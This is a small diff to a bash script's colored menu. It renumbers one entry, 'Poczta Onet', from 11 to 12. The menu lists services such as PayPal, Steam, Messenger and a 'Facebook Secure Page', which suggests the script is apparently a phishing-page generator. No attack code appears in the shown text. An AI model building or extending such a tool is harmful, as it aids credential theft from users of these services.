@@ -139,7 +139,7 @@ echo -e "\e[31m  [8] PayPal\e[0m"
 echo -e "\e[31m  [9] Messenger\e[0m"
 echo -e "\e[31m  [10] Steam\e[0m"
 echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
-echo -e "\e[31m  [11] Poczta Onet\e[0m"
+echo -e "\e[31m  [12] Poczta Onet\e[0m"
 echo -e "\e[92m  [13] EXIT \e[0m"
 echo "================="
 
